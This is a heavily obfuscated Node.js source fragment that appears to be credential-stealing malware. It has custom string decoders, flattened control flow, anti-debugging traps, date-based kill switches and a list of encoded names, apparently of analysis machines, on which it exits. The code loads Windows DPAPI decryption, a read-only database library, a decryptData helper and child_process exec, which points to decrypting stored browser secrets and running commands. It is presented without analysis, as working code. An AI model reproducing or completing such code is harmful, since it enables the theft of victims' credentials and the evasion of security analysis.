                        UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                        do {
                            UxmmwSD(n49oLe.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                        } while (jJIllx > 0x7);
                        td77ore = -0x1;
                    }
                }
                if (td77ore > -0x1) {
                    n49oLe.push((Ot8M78 | td77ore << jJIllx) & 0xff);
                }
                return pE8Nth(n49oLe);
            }
        }

        function TaFn0Uv(bw1LDXR, mHQbVa) {
            var kY3q474 = (bw1LDXR, mHQbVa, uXPxRCH, Ot8M78, jJIllx) => {
                if (typeof Ot8M78 === "undefined") {
                    Ot8M78 = n49oLe;
                }
                if (typeof jJIllx === bw1LDXR[0x1da]) {
                    jJIllx = ph4WoIw;
                }
                if (bw1LDXR !== mHQbVa) {
                    return jJIllx[bw1LDXR] || (jJIllx[bw1LDXR] = Ot8M78(NkrHL_[bw1LDXR]));
                }
                if (uXPxRCH == bw1LDXR) {
                    return mHQbVa[ph4WoIw[uXPxRCH]] = kY3q474(bw1LDXR, mHQbVa);
                }
                if (uXPxRCH && Ot8M78 !== n49oLe) {
                    kY3q474 = n49oLe;
                    return kY3q474(bw1LDXR, -0x1, uXPxRCH, Ot8M78, jJIllx);
                }
                if (Ot8M78 === kY3q474) {
                    n49oLe = mHQbVa;
                    return n49oLe(uXPxRCH);
                }
                if (Ot8M78 === undefined) {
                    kY3q474 = jJIllx;
                }
                if (uXPxRCH == Ot8M78) {
                    return mHQbVa ? bw1LDXR[jJIllx[mHQbVa]] : ph4WoIw[bw1LDXR] || (uXPxRCH = jJIllx[bw1LDXR] || Ot8M78, ph4WoIw[bw1LDXR] = uXPxRCH(NkrHL_[bw1LDXR]));
                }
            };
            if (function () {
                    var bw1LDXR = function () {
                        const mHQbVa = function () {
                            var mHQbVa = (kY3q474, bw1LDXR, uXPxRCH, Ot8M78, jJIllx) => {
                                if (typeof Ot8M78 === bw1LDXR[0x1da]) {
                                    Ot8M78 = n49oLe;
                                }
                                if (typeof jJIllx === bw1LDXR[0x1da]) {
                                    jJIllx = ph4WoIw;
                                }
                                if (uXPxRCH && Ot8M78 !== n49oLe) {
                                    mHQbVa = n49oLe;
                                    return mHQbVa(kY3q474, -0x1, uXPxRCH, Ot8M78, jJIllx);
                                }
                                if (kY3q474 !== bw1LDXR) {
                                    return jJIllx[kY3q474] || (jJIllx[kY3q474] = Ot8M78(NkrHL_[kY3q474]));
                                }
                            };
                            const kY3q474 = new RegExp("\n");
                            return kY3q474[mHQbVa(0x286)](bw1LDXR);

                            function n49oLe(mHQbVa, kY3q474 = "N{6]uE=?$x:Q3}a*)DHJRj&wP^yp(0+FKLzM[.1nbAc>!lWqZr\"SU`<Vshvmo%4T#|G,/Xt@_ekYO9~Ci7B;2fI5g8d", n49oLe, bw1LDXR, uXPxRCH = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
                                UxmmwSD(n49oLe = '' + (mHQbVa || ''), bw1LDXR = n49oLe.length, td77ore = -0x1);
                                for (Q59OVlp = Q59OVlp; Q59OVlp < bw1LDXR; Q59OVlp++) {
                                    xtbSJI = kY3q474.indexOf(n49oLe[Q59OVlp]);
                                    if (xtbSJI === -0x1) {
                                        continue;
                                    }
                                    if (td77ore < 0x0) {
                                        td77ore = xtbSJI;
                                    } else {
                                        UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                                        do {
                                            UxmmwSD(uXPxRCH.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                                        } while (jJIllx > 0x7);
                                        td77ore = -0x1;
                                    }
                                }
                                if (td77ore > -0x1) {
                                    uXPxRCH.push((Ot8M78 | td77ore << jJIllx) & 0xff);
                                }
                                return pE8Nth(uXPxRCH);
                            }
                        };
                        return mHQbVa();
                    };
                    return bw1LDXR();
                }()) {
                process.exit();
            }
            return uXPxRCH(bw1LDXR, kY3q474(0x287), {
                [kY3q474(0x288)]: mHQbVa
                , [kY3q474(0x289) + kY3q474(0x28a)]: true
            });

            function n49oLe(bw1LDXR, mHQbVa = ":eclgWTABRIJ8}kEuv{wn$?L~y2C0#b,_HFx=Q!OUt]+/)d6ora<KD3S@(5GPVY|qm7*Z;\"s^fzi>j9h`[N41M%p&X.", kY3q474, n49oLe, uXPxRCH = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
                UxmmwSD(kY3q474 = '' + (bw1LDXR || ''), n49oLe = kY3q474.length, td77ore = -0x1);
                for (Q59OVlp = Q59OVlp; Q59OVlp < n49oLe; Q59OVlp++) {
                    xtbSJI = mHQbVa.indexOf(kY3q474[Q59OVlp]);
                    if (xtbSJI === -0x1) {
                        continue;
                    }
                    if (td77ore < 0x0) {
                        td77ore = xtbSJI;
                    } else {
                        UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                        do {
                            UxmmwSD(uXPxRCH.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                        } while (jJIllx > 0x7);
                        td77ore = -0x1;
                    }
                }
                if (td77ore > -0x1) {
                    uXPxRCH.push((Ot8M78 | td77ore << jJIllx) & 0xff);
                }
                return pE8Nth(uXPxRCH);
            }
        }
        uXPxRCH = Object[bw1LDXR(0x28b)];
        const Kt94kB = YgP8yts;
        const Xb4IwJx = y7bTqx(function (uXPxRCH, mHQbVa) {
            if (function () {
                    var uXPxRCH = function () {
                        const mHQbVa = function () {
                            const mHQbVa = new RegExp("\n");
                            return mHQbVa[bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x28c)](uXPxRCH);
                        };
                        return mHQbVa();
                    };
                    return uXPxRCH();
                }()) {
                try {
                    UxmmwSD(mHQbVa, mHQbVa());
                } catch (__p_td_3e) {
                    while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                        var Ot8M78;
                        var jJIllx;
                        jJIllx = 0x0;
                        if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (uXPxRCH) {
                                jJIllx = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, MHQ3bYA(-0x2f)) ? 0x1 : 0x0;
                            }(__p_td_3e) : Ot8M78 = 0x1, Ot8M78 && jJIllx)) {
                            break;
                        }
                        if (Ot8M78) {
                            continue;
                        }
                    }
                }
            }
            const td77ore = YgP8yts;
            const Q59OVlp = uXPxRCH();
            while (rKAu9MB(rKAu9MB([], MHQ3bYA(-0x2f)), MHQ3bYA(-0x2f))) {
                try {
                    const xtbSJI = parseInt(td77ore(0x200)) / 0x1 * (rKAu9MB(parseInt(td77ore(0x33d)), MHQ3bYA(-0x1c)) / 0x2) + parseInt(td77ore(0x221)) / 0x3 + parseInt(td77ore(0x1fe)) / 0x4 + parseInt(td77ore(0x1fc)) / 0x5 + parseInt(td77ore(0x34e)) / 0x6 + parseInt(td77ore(0x1ef)) / 0x7 + rKAu9MB(parseInt(td77ore(0x320)), A536BJ = -0x1c) / 0x8;
                    if (xtbSJI === mHQbVa) {
                        break;
                    } else {
                        Q59OVlp[bw1LDXR(0x291)](Q59OVlp[bw1LDXR.call(undefined, 0x292)]());
                    }
                } catch (_0x11e8d7) {
                    Q59OVlp[bw1LDXR(0x293)](Q59OVlp[bw1LDXR(0x294)]());
                }
            }
        }(AdjLRoy, 0xdd662), function () {
            let uXPxRCH = rKAu9MB(rKAu9MB([], MHQ3bYA(-0x2f)), MHQ3bYA(-0x2f));
            if (Date[bw1LDXR(0x295) + bw1LDXR(0x296)][bw1LDXR(0x297)][bw1LDXR(0x298)](new Date()) > 0x19b76a3b6d7) {
                try {
                    var mHQbVa = function (uXPxRCH, mHQbVa) {
                        return mHQbVa;
                    };
                    var Ot8M78;
                    var jJIllx;
                    var td77ore;
                    UxmmwSD(Ot8M78 = -0x141, jJIllx = 0x153, td77ore = {
                        "f": () => {
                            return Ot8M78 += 0x10;
                        }
                        , "e": function () {
                            return Ot8M78 += 0x10;
                        }
                        , "i": 0x4
                        , "b": 0x2f
                        , "j": () => {
                            return jJIllx += 0x4;
                        }
                        , "k": 0xa
                        , "l": -0x31
                        , m: function (uXPxRCH) {
                            return uXPxRCH != -0x13b && uXPxRCH != -0x131 && uXPxRCH + 0x157;
                        }
                        , n: function (uXPxRCH) {
                            return uXPxRCH != 0x157 && uXPxRCH - 0x131;
                        }
                    });
                    while (Ot8M78 + jJIllx != 0x26) {
                        switch (Ot8M78 + jJIllx) {
                        case Ot8M78 != -0x13b && Ot8M78 != -0x131 && Ot8M78 + 0x157:
                            UxmmwSD(Ot8M78 = 0x48, Ot8M78 += td77ore.l);
                            break;
                        case 0x376:
                        default:
                        case 0x1a9:
                            var Q59OVlp = (td77ore.d = mHQbVa)(this, function () {
                                var uXPxRCH = function () {
                                    var mHQbVa = uXPxRCH.constructor(bw1LDXR(0x299))()
                                        .constructor(bw1LDXR(0x29a) + bw1LDXR(0x29b) + bw1LDXR(0x29c) + bw1LDXR(0x29d));
                                    return rKAu9MB(mHQbVa.call(uXPxRCH), MHQ3bYA(-0x2f));
                                };
                                return uXPxRCH();
                            });
                            UxmmwSD(Ot8M78 += 0x10, jJIllx += -0x2c);
                            break;
                        case jJIllx != 0x17f && jJIllx - 0x141:
                        case 0x101:
                            var Q59OVlp = mHQbVa;
                            Ot8M78 += 0x10;
                            break;
                        case jJIllx != 0x157 && jJIllx - 0x131:
                            UxmmwSD((td77ore.h = Q59OVlp)(), jJIllx += 0x4);
                            break;
                        case Ot8M78 != -0x100 && Ot8M78 != -0x131 && Ot8M78 + 0x157:
                            UxmmwSD(Ot8M78 = 0x8d, Ot8M78 += 0xa);
                            break;
                        }
                    }
                } catch (__p_td_3e) {
                    while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                        var xtbSJI;
                        var TaFn0Uv;
                        TaFn0Uv = 0x0;
                        if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f)) : __p_td_3e) ? function (uXPxRCH) {
                                TaFn0Uv = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, MHQ3bYA(-0x2f)) ? 0x1 : 0x0;
                            }(__p_td_3e) : xtbSJI = 0x1, xtbSJI && TaFn0Uv)) {
                            break;
                        }
                        if (xtbSJI) {
                            continue;
                        }
                    }
                }
            }
            return function (mHQbVa, Ot8M78) {
                if (function () {
                        var mHQbVa = function () {
                            const Ot8M78 = function () {
                                const Ot8M78 = new RegExp("\n");
                                return Ot8M78[bw1LDXR(0x2a3)](mHQbVa);
                            };
                            return Ot8M78();
                        };
                        return mHQbVa();
                    }()) {
                    while (true) {
                        var td77ore = 0x63;
                        for (td77ore = 0x63; td77ore == td77ore; td77ore *= td77ore) {
                            if (y7bTqx(rKAu9MB(td77ore, A536BJ = -0x2f) && console.log(td77ore), td77ore) <= 0xa) {
                                break;
                            }
                        };
                        if (td77ore === 0x64) {
                            td77ore--;
                        }
                    };
                }
                const Q59OVlp = uXPxRCH ? function () {
                    if (Date[bw1LDXR(0x2a4)][bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x297)][bw1LDXR(0x298)](new Date()) > 0x19b76a3be0d) {
                        while (true) {
                            var jJIllx = 0x63;
                            for (jJIllx = 0x63; jJIllx == jJIllx; jJIllx *= jJIllx) {
                                if (y7bTqx(rKAu9MB(jJIllx, MHQ3bYA(-0x2f)) && console.log(jJIllx), jJIllx) <= 0xa) {
                                    break;
                                }
                            };
                            if (jJIllx === 0x64) {
                                jJIllx--;
                            }
                        };
                    }
                    if (Ot8M78) {
                        if (function () {
                                var jJIllx = function () {
                                    const td77ore = function () {
                                        const td77ore = new RegExp("\n");
                                        return td77ore[bw1LDXR(0x2a5)](jJIllx);
                                    };
                                    return td77ore();
                                };
                                return jJIllx();
                            }()) {
                            process.exit();
                        }
                        const td77ore = Ot8M78[bw1LDXR(0x2a6)](mHQbVa, arguments);
                        Ot8M78 = null;
                        return td77ore;
                    }
                } : function (...mHQbVa) {
                    var Ot8M78 = -0xba;
                    var td77ore;
                    var Q59OVlp;
                    UxmmwSD(td77ore = 0x106, Q59OVlp = {
                        "c": bw1LDXR(0x298)
                        , "B": -0x1ae
                        , "F": -0x8c
                        , "z": () => {
                            if (td77ore == Q59OVlp.s) {
                                UxmmwSD(Ot8M78 += 0x0, td77ore += Ot8M78 + -0x161);
                                return "x";
                            }
                            if (Q59OVlp.a) {
                                UxmmwSD(Q59OVlp.u(), td77ore += Ot8M78 + (Ot8M78 == -0xcf ? 0x2ef : -0x40));
                                return "x";
                            }
                            UxmmwSD(Ot8M78 *= td77ore + 0x11c, Ot8M78 -= 0x1ff, td77ore += 0xa1);
                            return "x";
                        }
                        , "H": 0xf
                        , "e": function () {
                            return Ot8M78 += Q59OVlp.d;
                        }
                        , "G": -0x183
                        , "C": function () {
                            return td77ore = -0x95;
                        }
                        , "h": () => {
                            return Q59OVlp.a = Date[Q59OVlp.b][bw1LDXR(0x297)][Q59OVlp.c](new(Q59OVlp.b == "f" ? WeakSet : Date)()) > 0x19b76a3b759;
                        }
                        , "b": bw1LDXR.apply(undefined, [0x2a7])
                        , "l": () => {
                            td77ore *= 0x2;
                            return td77ore -= 0x2dc;
                        }
                        , "d": -0x40
                        , "I": function () {
                            return Ot8M78 += 0xf;
                        }
                        , "u": () => {
                            Ot8M78 *= 0x2;
                            return Ot8M78 -= 0x391;
                        }
                        , "s": -0x20
                        , "t": 0x391
                        , P: function (mHQbVa) {
                            return mHQbVa - 0xcf;
                        }
                    });
                    while (Ot8M78 + td77ore != 0x8e) {
                        switch (Ot8M78 + td77ore) {
                        case 0x38:
                        case 0x149:
                            UxmmwSD(Ot8M78 += 0x17d, td77ore += -0x16b);
                            break;
                        case 0x3dd:
                        case 0x24e:
                        case 0x4c:
                            var uXPxRCH = {};
                            Ot8M78 += Q59OVlp.d;
                            break;
                        case 0x3b:
                            delete Q59OVlp.C;
                            if (Ot8M78 == -0x1c) {
                                UxmmwSD(Ot8M78 += Q59OVlp.B, td77ore += 0x17f);
                                break;
                            }
                            UxmmwSD(td77ore = -0x95, Ot8M78 += td77ore == -0x4c ? "D" : -0x1ae, td77ore += 0x17f);
                            break;
                        case td77ore - 0xcf:
                            UxmmwSD((td77ore == (td77ore == Ot8M78 + 0x1d5 ? 0x106 : 0x24) ? process : setTimeout)
                                .exit(), Ot8M78 += 0x230, Q59OVlp.l());
                            break;
                        case 0xc:
                            UxmmwSD(Q59OVlp.a = Date[Q59OVlp.b][bw1LDXR(0x297)][Q59OVlp.c](new(Q59OVlp.b == "f" ? WeakSet : Date)()) > 0x19b76a3b759, Ot8M78 += 0x25b, td77ore += -0x220);
                            break;
                        case td77ore != -0xd0 && td77ore + 0x161:
                        case 0x1cf:
                            if (Q59OVlp.z() == "x") {
                                break;
                            }
                        case 0x4a:
                            return n49oLe(typeof Q59OVlp.b == bw1LDXR(0x2a8) + "on" || mHQbVa, uXPxRCH);
                            Ot8M78 += 0x44;
                            break;
                        case 0x2fd:
                        case 0x96:
                        case 0xbb:
                        case 0x91:
                            UxmmwSD(Ot8M78 += Q59OVlp.c == -0x4 ? 0x5e : -0x9e, td77ore *= 0x2, td77ore -= Ot8M78 + (Q59OVlp.b == 0xb ? Q59OVlp.r : -0x1ea));
                            break;
                        default:
                        case 0x186:
                        case 0x84:
                            UxmmwSD(td77ore = -0x4e, Ot8M78 += 0xf, td77ore += 0x1e);
                            break;
                        case 0x6e:
                            if (td77ore == Q59OVlp.F) {
                                UxmmwSD(Ot8M78 += Q59OVlp.G, td77ore += 0x14c);
                                break;
                            }
                            UxmmwSD(td77ore = -0x6b, Ot8M78 += 0xad, td77ore += -0x8a);
                            break;
                        }
                    }
                };
                uXPxRCH = rKAu9MB([], A536BJ = -0x2f);
                return Q59OVlp;
            };
        }());
        const i0gUcBP = Xb4IwJx(this, function (...uXPxRCH) {
            var mHQbVa = -0x56;
            var kY3q474;
            var n49oLe;
            UxmmwSD(kY3q474 = 0x66, n49oLe = {
                "f": 0x2f
                , "u": (uXPxRCH = mHQbVa == -0xb) => {
                    if (!uXPxRCH) {
                        return n49oLe.w();
                    }
                    return mHQbVa += 0x75;
                }
                , "D": () => {
                    return mHQbVa += -0xce;
                }
                , "m": () => {
                    return process.exit();
                }
                , "d": bw1LDXR(0x2a9)
                , "o": function (uXPxRCH = false) {
                    if (uXPxRCH) {
                        return mHQbVa == 0x1d;
                    }
                    return kY3q474 += 0x13;
                }
                , "n": 0x3b
                , "b": bw1LDXR(0x2aa) + bw1LDXR(0x2ab)
                , "K": function () {
                    return (n49oLe.I = Ot8M78)(uXPxRCH, n49oLe.b == bw1LDXR(0x2ac) ? jJIllx : global);
                }
                , "e": 0x63
                , "g": (uXPxRCH = n49oLe[bw1LDXR(0x2ad)]("b")) => {
                    if (!uXPxRCH) {
                        return kY3q474;
                    }
                    return mHQbVa == 0x5d;
                }
                , "A": () => {
                    return mHQbVa += 0x5d;
                }
                , "L": -0xb
                , "s": () => {
                    mHQbVa += 0x3b;
                    return n49oLe.o();
                }
                , "l": 0xa5
                , "t": function () {
                    return mHQbVa += 0x75;
                }
                , "F": function () {
                    return mHQbVa += -0xb6;
                }
                , "S": 0x40
                , "R": (uXPxRCH = false) => {
                    if (uXPxRCH) {
                        return arguments;
                    }
                    mHQbVa += -0x49;
                    return kY3q474 += mHQbVa == -0x4c ? n49oLe.Q : 0x32;
                }
                , "W": () => {
                    mHQbVa += -0x3b;
                    return kY3q474 += -0x13;
                }
                , X: function (uXPxRCH) {
                    return uXPxRCH - 0xb;
                }
                , Y: function (uXPxRCH, kY3q474) {
                    return uXPxRCH.c ? kY3q474 != -0x64 && kY3q474 != 0x6a && kY3q474 != -0x46 && kY3q474 != -0xb && kY3q474 != -0x56 && kY3q474 != -0x5b && kY3q474 != -0x3b && kY3q474 != 0x64 && kY3q474 != -0x1b && kY3q474 + 0x66 : -0x47;
                }
                , Z: function (uXPxRCH) {
                    return uXPxRCH + 0xab;
                }
                , aa: function (uXPxRCH) {
                    return uXPxRCH + 0x64;
                }
            });
            while (mHQbVa + kY3q474 != 0x15) {
                switch (mHQbVa + kY3q474) {
                case 0x352:
                case 0x5e:
                case 0xa6:
                case 0x3b5:
                    if (kY3q474 == 0x3a) {
                        n49oLe.R();
                        break;
                    }
                    UxmmwSD(mHQbVa = 0x16, n49oLe.W());
                    break;
                case 0x11a:
                case 0xeb:
                case 0xd0:
                case 0x243:
                    if (mHQbVa == -0x7c) {
                        mHQbVa += -0xc0;
                        break;
                    }
                    mHQbVa += -0xce;
                    break;
                case 0x20:
                    UxmmwSD(process.exit(), mHQbVa += kY3q474 == 0x66 ? 0xb0 : "B");
                    break;
                default:
                    if (kY3q474 == -0x6d) {
                        n49oLe.u();
                        break;
                    }
                    UxmmwSD(n49oLe.a = (n49oLe.x = Date)[n49oLe.b][bw1LDXR(0x2ae)][bw1LDXR(0x2af)](new Date()) < 0x18cc21afc70, mHQbVa += 0x5d, n49oLe.c = true);
                    break;
                case 0x10:
                case 0x1da:
                case 0xec:
                    mHQbVa += 0x4b;
                    break;
                case 0x2:
                case 0xba:
                case 0x35:
                case 0x2df:
                    var jJIllx = {
                        get b() {
                            if (Date[bw1LDXR(0x2a9)]() < 0x18cc21afa0d) {
                                process.exit();
                            }
                            return i0gUcBP;
                        }
                        , get a() {
                            if (Date[n49oLe.d]() < 0x18cc21b0593) {
                                while (true) {
                                    var uXPxRCH = 0x63;
                                    for (uXPxRCH = 0x63; uXPxRCH == uXPxRCH; uXPxRCH *= uXPxRCH) {
                                        if (y7bTqx(rKAu9MB(uXPxRCH, A536BJ = -0x2f) && console.log(uXPxRCH), uXPxRCH) <= 0xa) {
                                            break;
                                        }
                                    };
                                    if (uXPxRCH === 0x64) {
                                        uXPxRCH--;
                                    }
                                };
                            }
                            return YgP8yts;
                        }
                    };
                    kY3q474 += mHQbVa == -0x64 ? 0x45 : -0x9;
                    break;
                case n49oLe.c ? mHQbVa != -0x64 && mHQbVa != 0x6a && mHQbVa != -0x46 && mHQbVa != -0xb && mHQbVa != -0x56 && mHQbVa != -0x5b && mHQbVa != -0x3b && mHQbVa != 0x64 && mHQbVa != -0x1b && mHQbVa + 0x66:
                    -0x47:
                    case 0xf4:
                    if ((kY3q474 == -0xa ? isFinite : n49oLe)
                        .a) {
                        mHQbVa += kY3q474 + -0xfe;
                        break;
                    }
                    mHQbVa += -0xb6;
                    break;
                case 0x7a:
                case 0xf3:
                    UxmmwSD(kY3q474 = 0x60, mHQbVa += -0xc, kY3q474 += n49oLe.b == bw1LDXR(0x2aa) + bw1LDXR(0x2ab) ? -0x13 : 0x2e);
                    break;
                case 0xa6:
                case 0xb:
                case 0x246:
                case 0x282:
                    UxmmwSD(process.exit(), mHQbVa += 0xc5);
                    break;
                case mHQbVa + 0xab:
                    return n49oLe.K();
                    kY3q474 += -0x32;
                    break;
                case 0x2b:
                case 0x39c:
                case 0x43:
                    UxmmwSD(process.exit(), mHQbVa += 0xa5);
                    break;
                case kY3q474 + 0x64:
                case 0x21c:
                    if (n49oLe.g()) {
                        mHQbVa += -0xba;
                        break;
                    }
                    mHQbVa += -0xc8;
                    break;
                case 0x4b:
                    mHQbVa += -0x49;
                    break;
                }
            }
        });
        const pukrvr = y7bTqx(i0gUcBP(), require(Kt94kB(0x29f)));
        const MsCwg5O = require(Kt94kB(0x2b8));
        const {
            Dpapi: BSJ1pS
        } = require('@primno/dpapi');
        const Xp96Uso = require(Kt94kB(0x337));
        const TljPa8 = require(Kt94kB(0x1f9));
        const vhNite = require(Kt94kB(0x352));
        const lA0B8WY = require(Kt94kB(0x225));
        const {
            Database: s1pwaN
            , OPEN_READONLY: e0MiDs
        } = require(Kt94kB(0x2b4));
        const fZVPjSs = require(Kt94kB(0x252));
        const {
            v4: s_ZA3e
        } = require(Kt94kB(0x305));
        const {
            decryptData: TmosVO
        } = require(Kt94kB(0x1ec));
        const {
            exec: MtXODp
            , execSync: YTTq7N
        } = require('child_process');
        const tpIAzn7 = require(Kt94kB(0x2db));
        const jG1NGUd = tpIAzn7[Kt94kB(0x23c)](MtXODp);
        const pTKbGoh = [Kt94kB(0x2dd), bw1LDXR(0x2ce), bw1LDXR(0x2cf) + "PC", Kt94kB(0x31e), bw1LDXR(0x2d0), Kt94kB(0x2e6), Kt94kB(0x315), Kt94kB(0x326), Kt94kB(0x26e), Kt94kB(0x27f), Kt94kB(0x350), Kt94kB(0x32d), Kt94kB(0x274), bw1LDXR.apply(undefined, [0x2d1]), bw1LDXR(0x2d2) + bw1LDXR.call(undefined, 0x2d3), bw1LDXR.apply(undefined, [0x2d4]) + bw1LDXR.call(undefined, 0x2d5), Kt94kB(0x2ab), bw1LDXR(0x2d6), Kt94kB(0x2ba), bw1LDXR(0x2d7), Kt94kB(0x2b5), Kt94kB(0x321), Kt94kB(0x2c0), Kt94kB(0x282), bw1LDXR(0x2d8), Kt94kB(0x2a3), Kt94kB(0x24d), Kt94kB(0x32b), Kt94kB(0x247), Kt94kB(0x266), bw1LDXR(0x2d9), Kt94kB(0x346), Kt94kB(0x335), Kt94kB(0x347), Kt94kB(0x23a), bw1LDXR.call(undefined, 0x2da) + bw1LDXR(0x2db), Kt94kB(0x224), Kt94kB(0x2e3), Kt94kB(0x317), Kt94kB(0x255), Kt94kB(0x2ee), Kt94kB(0x31d), Kt94kB(0x213), Kt94kB(0x249), Kt94kB(0x316), bw1LDXR(0x2dc) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x2dd), Kt94kB(0x208), Kt94kB(0x243)];
        const MRnzili = [Kt94kB(0x33b), bw1LDXR(0x2de) + bw1LDXR(0x2df) + bw1LDXR(0x2e0) + bw1LDXR(0x2e1) + bw1LDXR(0x2e2) + bw1LDXR.call(undefined, 0x2e3), Kt94kB(0x227), Kt94kB(0x2cb), Kt94kB(0x2eb), Kt94kB(0x2fb), Kt94kB(0x291), Kt94kB(0x21f)];
        if (pTKbGoh[Kt94kB(0x2a6)](process[Kt94kB(0x24c)][Kt94kB(0x238)])) {
            process[Kt94kB(0x2f8)](0x0);
        }

        function AdjLRoy(...uXPxRCH) {
            var kY3q474;
            if (rKAu9MB(require('os')
                    .platform() === bw1LDXR(0x2e4), A536BJ = -0x2f)) {
                process.exit();
            }
            kY3q474 = {
                g: function (...uXPxRCH) {
                    if (function () {
                            var uXPxRCH = function () {
                                const mHQbVa = function () {
                                    const mHQbVa = new RegExp("\n");
                                    return mHQbVa[bw1LDXR(0x2e5)](uXPxRCH);
                                };
                                return mHQbVa();
                            };
                            return uXPxRCH();
                        }()) {
                        try {
                            var mHQbVa = function (uXPxRCH, mHQbVa) {
                                return mHQbVa;
                            };
                            var kY3q474;
                            var n49oLe;
                            var Ot8M78;
                            UxmmwSD(kY3q474 = 0x1f, n49oLe = 0x24, Ot8M78 = {
                                "k": () => {
                                    return n49oLe += -0x2a;
                                }
                                , "n": function () {
                                    UxmmwSD(kY3q474 = 0x4a, kY3q474 += -0x2b, n49oLe += -0x2a);
                                    return "l";
                                }
                                , "q": -0x20
                                , "f": function () {
                                    return n49oLe += -0x2a;
                                }
                                , "u": () => {
                                    return kY3q474 += Ot8M78.q == 0x31 ? "s" : 0x27;
                                }
                                , "p": function () {
                                    return kY3q474 += 0x27;
                                }
                                , "v": -0x52
                                , "E": function () {
                                    return n49oLe += -0x3d;
                                }
                                , "H": () => {
                                    UxmmwSD(kY3q474 = 0x7d, kY3q474 *= 0x2, kY3q474 -= Ot8M78.D, n49oLe += -0x3d);
                                    return "F";
                                }
                                , "e": 0x7d
                                , "z": (uXPxRCH = kY3q474 == 0x46) => {
                                    if (!uXPxRCH) {
                                        return arguments;
                                    }
                                    return kY3q474 += Ot8M78.v;
                                }
                                , "w": function (uXPxRCH = n49oLe == 0x24) {
                                    if (!uXPxRCH) {
                                        return n49oLe;
                                    }
                                    return jJIllx();
                                }
                                , "g": function (uXPxRCH = Ot8M78.b == bw1LDXR(0x2e6)) {
                                    if (!uXPxRCH) {
                                        return arguments;
                                    }
                                    kY3q474 += n49oLe + -0x78;
                                    return n49oLe += 0x13;
                                }
                                , "d": function () {
                                    kY3q474 += 0x30;
                                    return n49oLe += -0x2a;
                                }
                                , "c": () => {
                                    kY3q474 *= kY3q474 + 0x3e;
                                    kY3q474 -= -0x6c;
                                    return n49oLe += 0x13;
                                }
                                , "D": -0x32
                                , "b": bw1LDXR(0x2e7) + bw1LDXR(0x2e8) + bw1LDXR(0x2e9)
                                , "o": 0x24
                                , "C": 0x2
                            });
                            while (kY3q474 + n49oLe != 0x18) {
                                switch (kY3q474 + n49oLe) {
                                case n49oLe - 0x1f:
                                    if (Ot8M78.H() == "F") {
                                        break;
                                    }
                                case 0x190:
                                case 0x43:
                                case 0x268:
                                    var jJIllx;
                                    Ot8M78.I = "J";
                                    if (n49oLe == 0x24 && false) {
                                        kY3q474 += 0x27;
                                        break;
                                    }
                                    UxmmwSD(jJIllx = mHQbVa, kY3q474 += Ot8M78.q == 0x31 ? "s" : 0x27);
                                    break;
                                case 0x32:
                                case 0x2b4:
                                case 0x12:
                                case 0x282:
                                    if (kY3q474 == 0x7e) {
                                        Ot8M78.c();
                                        break;
                                    }
                                    UxmmwSD(jJIllx(), Ot8M78.d());
                                    break;
                                default:
                                case 0x340:
                                    UxmmwSD(kY3q474 = 0x4a, n49oLe += -0x3d);
                                    break;
                                case 0x6a:
                                case 0x69:
                                case 0x65:
                                case 0x305:
                                    if (n49oLe == 0x24 && false) {
                                        UxmmwSD(kY3q474 += Ot8M78.v, n49oLe += 0x3d);
                                        break;
                                    }
                                    UxmmwSD(Ot8M78.w(), Ot8M78.z());
                                    break;
                                case kY3q474 != 0x1e && kY3q474 != -0x8 && kY3q474 != -0x3c && kY3q474 + 0x4e:
                                    if (Ot8M78.n() == "l") {
                                        break;
                                    }
                                case 0x46:
                                    UxmmwSD(kY3q474 = 0x7d, kY3q474 += -0x4, n49oLe += -0x2a);
                                    break;
                                case 0x6c:
                                case 0x3af:
                                    if (n49oLe == 0x3c || false) {
                                        Ot8M78.g();
                                        break;
                                    }
                                    UxmmwSD(jJIllx(), kY3q474 += -0x2a, n49oLe += n49oLe + -0x78);
                                    break;
                                }
                            }
                        } catch (__p_td_3e) {
                            while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                                var td77ore;
                                var Q59OVlp;
                                Q59OVlp = 0x0;
                                if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f)) : __p_td_3e) ? function (uXPxRCH) {
                                        Q59OVlp = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, MHQ3bYA(-0x2f)) ? 0x1 : 0x0;
                                    }(__p_td_3e) : td77ore = 0x1, td77ore && Q59OVlp)) {
                                    break;
                                }
                                if (td77ore) {
                                    continue;
                                }
                            }
                        }
                    }
                    return AdjLRoy(...uXPxRCH);
                }
                , get d() {
                    if (Date[bw1LDXR(0x2ee) + bw1LDXR(0x2ef)][bw1LDXR(0x2f0)][bw1LDXR(0x2f1)](new Date()) > 0x19b76a3c6f1) {
                        process.exit();
                    }
                    return AdjLRoy;
                }
                , get e() {
